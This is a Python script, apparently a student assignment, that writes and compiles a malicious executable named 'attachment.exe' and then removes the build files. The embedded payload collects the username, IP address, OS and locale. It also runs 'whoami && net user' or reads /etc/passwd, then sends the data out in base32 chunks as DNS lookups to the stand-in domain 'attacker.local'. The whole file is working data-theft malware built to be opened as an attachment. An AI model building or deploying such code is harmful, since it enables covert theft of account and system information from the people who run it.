# attach_create.py
# Meir Shuker 318901527 Noa Agassi 209280635

import os
import shutil
import subprocess

payload_code = r'''
import os
import socket
import platform
import subprocess
import locale
import time
import base64, random

DNS_SERVER_IP = "192.168.68.131"
ATTACK_DOMAIN = "attacker.local"
CHUNK_LEN = 48

def get_username():
    try:
        return os.getlogin()
    except:
        return os.getenv("USERNAME") or os.getenv("USER") or "unknown"

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"

def get_os_version():
    return platform.system() + "_" + platform.release()

def get_languages():
    try:
        lang = locale.getdefaultlocale()
        return lang[0] if lang else "unknown"
    except:
        return "unknown"

def get_sensitive_info():
    try:
        if os.name == 'nt':
            return subprocess.check_output("whoami && net user", shell=True).decode()
        else:
            with open("/etc/passwd", "r") as f:
                return f.read()
    except:
        return "error"

def b32_encode(text: str) -> str:
    """Return lowercase base32 string without padding."""
    return base64.b32encode(text.encode()).decode().rstrip("=").lower()

def b32_decode(blob: str) -> str:
    pad = "=" * (-len(blob) % 8)
    return base64.b32decode((blob + pad).upper()).decode()


def split_to_chunks(text: str) -> list[tuple[int, str]]:
    encoded = b32_encode(text)
    idx, chunks = 0, []
    while encoded:
        part, encoded = encoded[:CHUNK_LEN], encoded[CHUNK_LEN:]
        chunks.append((idx, part))
        idx += 1
    return chunks

def send_dns_data(chunks):
    for label in chunks:
        qname = f"{label}.{ATTACK_DOMAIN}"
        try:
            socket.gethostbyname(qname)
        except Exception:
            pass
        time.sleep(0.12)


def main():
    print("[*] Collecting system info...")

    username = get_username()
    ip = get_ip().replace(".", "")
    os_version = get_os_version().lower().replace(" ", "_")
    lang = get_languages().lower()

    stage1 = f"user-{username}.ip-{ip}.lang-{lang}.os-{os_version}"
    stage2 = get_sensitive_info()

    print("[*] Sending DNS queries...")

    # Stage 1
    stage1_chunks = split_to_chunks(stage1)
    stage1_chunks = [f"STAGE1_{idx}_{raw}" for idx, raw in stage1_chunks]
    send_dns_data(stage1_chunks)

    # Stage 2
    stage2_chunks = split_to_chunks(stage2)
    stage2_chunks = [f"STAGE2_{idx}_{raw}" for idx, raw in stage2_chunks]
    send_dns_data(stage2_chunks)

        # ---------- FINISH ----------
    for _ in range(3):
        try:
            socket.gethostbyname(f"FINISH.{ATTACK_DOMAIN}")
        except Exception:
            pass
        time.sleep(0.15)

    print("[*] Done.")

if __name__ == "__main__":
    main()
'''

def get_pyinstaller_command():
    local_path = os.path.expanduser("~/.local/bin/pyinstaller")
    return local_path if os.path.exists(local_path) else "pyinstaller"


def build_payload_file():
    with open("temp_payload.py", "w", encoding="utf-8") as f:
        f.write(payload_code)
    print("[+] Payload code written to temp_payload.py")


def build_executable():
    py_cmd = get_pyinstaller_command()
    print("[*] Building executable from temp_payload.py...")
    subprocess.call([py_cmd, "--onefile", "temp_payload.py"])


def move_output():
    src = os.path.join("dist", "temp_payload.exe" if os.name == 'nt' else "temp_payload")
    dst = "attachment.exe"
    if os.path.exists(src):
        shutil.move(src, dst)
        print(f"[+] Executable ready: {dst}")
    else:
        print("[-] Build failed. Could not find output file.")


def clean_up():
    for path in ["build", "dist", "__pycache__", "temp_payload.spec", "temp_payload.py"]:
        if os.path.isdir(path):
            shutil.rmtree(path)
        elif os.path.isfile(path):
            os.remove(path)


# ========== main ==========

if __name__ == "__main__":
    print("=== Attachment Builder ===")

    build_payload_file()
    build_executable()
    move_output()
    clean_up()

    print("[✓] Executable created successfully and cleaned up build files.")